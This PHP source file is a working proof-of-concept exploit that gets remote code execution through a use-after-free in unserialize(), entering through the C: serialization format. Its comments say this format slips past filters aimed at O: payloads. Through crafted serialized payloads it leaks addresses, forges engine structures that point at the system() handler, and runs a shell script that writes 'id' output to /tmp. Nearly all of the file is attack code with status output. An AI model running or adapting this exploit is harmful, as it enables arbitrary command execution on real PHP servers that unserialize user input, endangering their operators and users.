<?php
// shape12_c_entry.php — zero4 RCE ENTERED VIA THE C: FORMAT (second entry
// path). Identical chain to pwn_zero4_live.php (var_destroy re-entry UAF,
// 8.5.12, fixed upstream 08f4b64), but BOTH destroy-walk destructor objects
// (Stage1 = leak stage, FIRE = forge stage) are created by the C: custom-
// serialization format instead of the standard O: object format:
//
//   O:6:"Stage1":0:{}   ->   C:6:"Stage1":0:{}
//   O:4:"FIRE":0:{}     ->   C:4:"FIRE":0:{}
//
// Why it works on the whole 8.4/8.5 release fleet (fc lane receipts,
// FRESH_CODE_STATUS.md FC-1): object_custom() on a class with
// ce->unserialize == NULL unconditionally does object_init_ex(rval, ce)
// (GH-22046's fix b50b30c/4bf700e never left master). The C:-created object
// is a fully functional instance: __destruct registers, the dup-key slot
// trick still makes it fire during var_destroy's unbracketed dtor walk, and
// its destructor re-enters unserialize() on the dying context — the zero4
// chain verbatim.
//
// Attack-surface doubling: an app that feeds user input to unserialize() is
// now entryable through BOTH formats. A filter that blocks/rewrites O:
// payloads (the classic POP-chain mitigation) does not touch C: payloads —
// and C: additionally instantiates ARBITRARY internal classes on the release
// branches (Dom\Element NULL-deref crashers etc., fc_c_crashmatrix.txt).
//
// usage: php -n shape12_c_entry.php [attempts [firepayload [off_empty_hex
//        [off_zif_hex]]]]
//   defaults: 5 attempts, C-format FIRE payload, plain2 8.5.12 offsets.

$ATTEMPTS = (int)($argv[1] ?? 5);
$FIREPAY  = (string)($argv[2] ?? 'C:4:"FIRE":0:{}');
$OFF_EMPTY_HEX = (string)($argv[3] ?? 'ffe460');
$OFF_ZIF_HEX   = (string)($argv[4] ?? '523c60');
$MARKER   = '/tmp/pwned_zero4_c_entry';

@unlink($MARKER);
file_put_contents('/tmp/e', "id > $MARKER\n");

class D { public static string $dp = ''; public static string $fp = ''; }
class E {
    public static int $OFF_EMPTY = 0;
    public static int $OFF_ZIF   = 0;
    public static int $block2 = 0;
    public static int $base = 0;
}
E::$OFF_EMPTY = hexdec($OFF_EMPTY_HEX);
E::$OFF_ZIF   = hexdec($OFF_ZIF_HEX);

class Stage1 {
    public function __destruct() {
        $arr = unserialize(D::$dp);
        $blk = $arr[129];
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
            echo "DANCE-MISS (attempt skipped)\n"; return;
        }
        $block2 = $blk - 5056;
        echo "M1 block2 = 0x", dechex($block2), "\n";

        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { echo "LEAK-MISS T_u5\n"; return; }

        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

        $u10 = unserialize('a:0:{}');
        $len_s = strlen($vs);

        $u11 = unserialize('a:0:{}');
        $u12 = unserialize('a:0:{}');
        $u13 = unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

        $u14 = unserialize('a:0:{}');
        $u15 = unserialize('a:0:{}');
        $u16 = unserialize('a:0:{}');
        $u17 = unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        $u18 = unserialize('a:0:{}');
        $len_s2 = strlen($vs2);

        echo "M2 T_u5=0x", dechex($vm5), " T_u13=0x", dechex($vm13),
             " spacing=", ($vm13 - $vm5), "\n";
        echo "M2 ORACLE1=0x", dechex($len_s), " ORACLE2=0x", dechex($len_s2), "\n";

        if ($vm13 - $vm5 !== 128)          { echo "M2-BAIL slot spacing\n"; return; }
        if ($len_s !== $len_s2)            { echo "M2-BAIL oracle mismatch\n"; return; }
        if (($len_s & 0xfff) !== (E::$OFF_EMPTY & 0xfff)) {
            echo "M2-BAIL oracle lo12 (offset table mismatch?)\n"; return;
        }
        $base = $len_s - E::$OFF_EMPTY;
        if (($base & 0xfff) !== 0)         { echo "M2-BAIL base misaligned\n"; return; }

        E::$block2 = $block2;
        E::$base   = $base;
        echo "M2-DONE base=0x", dechex($base),
             " zif_system=0x", dechex($base + E::$OFF_ZIF), "\n";

        unset($arr);

        // Push FIRE's dtor entry AFTER the dance array's slot[1] — C: entry:
        unserialize(D::$fp);
    }
}

class FIRE {
    public function __destruct() {
        $block2 = E::$block2; $base = E::$base;
        if (!$block2 || !$base) { echo "FIRE-BAIL no statics\n"; return; }
        $ZIF = $base + E::$OFF_ZIF;

        $V = function ($off) use ($block2) { return $block2 + 24 + $off; };
        $OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

        $MAGIC1 = 0x4142434445464748;
        $MAGIC2 = 0x1122334455667788;

        $pat  = pack('P', $V(32));
        $pat .= pack('P', $V(48));
        $pat .= pack('P', $V(64));
        $pat .= pack('P', $V(112));
        $pat .= pack('PVV', $V(80), 6, 0);
        $pat .= pack('PVV', $V(88), 6, 0);
        $pat .= pack('PVV', $OBJ, 0x108, 0);
        $pat .= str_repeat("\x00", 16);
        $pat .= pack('P', $MAGIC1);
        $pat .= pack('P', $MAGIC2);
        $pat .= pack('PVV', $base - 16, 6, 0);
        $pat .= pack('VV', 1, 0x208);
        $pat .= pack('VV', 0, 0);
        $pat .= pack('P', $CE);
        $pat .= pack('P', $HT);
        $pat .= pack('P', 0);
        $pat .= pack('P', 0x0000000100000000);
        $pat .= str_repeat("\x00", 32);
        $pat .= pack('PVV', $SMINI, 6, 0);
        $pat .= pack('VV', 1, 0x16);
        $pat .= pack('P', 0);
        $pat .= pack('P', 9);
        $pat .= "sh /tmp/e\x00";
        $pat .= str_repeat("\x00", 600 - 258);
        $pat .= pack('VV', 0, 0);
        $pat .= pack('P', 0);
        $pat .= pack('P', $ZIF);
        $pat .= str_repeat("\x00", 136 - 24);
        $pat .= pack('P', $ZIF);
        $pat .= str_repeat("\x00", 160 - 144);
        $pat .= pack('P', $ZIF);
        $pat .= str_repeat("\x00", 208 - 168);
        $pat .= str_repeat("\x00", 1600 - 808);
        $pat .= str_repeat("\x00", 2040 - 1600);

        $s = str_repeat($pat, 4);
        echo "M3-STR patlen=", strlen($pat), " strlen=", strlen($s),
             " first16=", bin2hex(substr($s, 0, 16)), "\n";
        flush();

        $c1z = unserialize('R:1020;');
        echo "M3-R1020-done\n"; flush();
        $c2z = unserialize('R:1021;');
        echo "M3-R1021-done\n"; flush();
        $c1 = strlen($c1z); $c2 = strlen($c2z);
        if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
            echo "RECLAIM-MISS c1=0x", dechex($c1), " c2=0x", dechex($c2), "\n";
            return;
        }
        echo "M3 string reclaim OK (canaries verified at block2)\n";

        $c3z = unserialize('R:1023;');
        echo "M3-R1023-done\n"; flush();
        $c3 = strlen($c3z);
        if (($c3 & 0x00FFFFFFFFFFFFFF) !== 0x00010102464c457f) {
            echo "M3-BAIL base ELF-magic mismatch: 0x", dechex($c3),
                 " (offset table wrong for this build — clean bail)\n";
            return;
        }
        echo "M3 BASE verified via ELF magic at BASE+0\n"; flush();

        $r1 = unserialize('R:1022;');
        echo "M3 forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF), "\n";
        echo "TRIGGER var_dump(\$r1) -> zif_system(fake_execute_data)\n";
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

// ---- payloads ----
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2*$m+4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256*$j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';
D::$fp = $FIREPAY;

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
// THE SECOND ENTRY: Stage1 created by the C: format, not O:.
$els[] = 'i:9998;C:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';

for ($try = 1; $try <= $ATTEMPTS; $try++) {
    echo "=== attempt $try ===\n";
    $r = @unserialize($payload);
    echo "outer ok=", var_export($r !== false, true), "\n";
    if (is_file($MARKER)) { break; }
}
if (is_file($MARKER)) {
    echo "MARKER $MARKER:\n", trim(file_get_contents($MARKER)), "\n";
    echo "[PASS] zero4 live RCE via C: format entry: in-band, no gdb, ASLR on\n";
} else {
    echo "[FAIL] marker missing\n";
}
echo "SCRIPT-END\n";
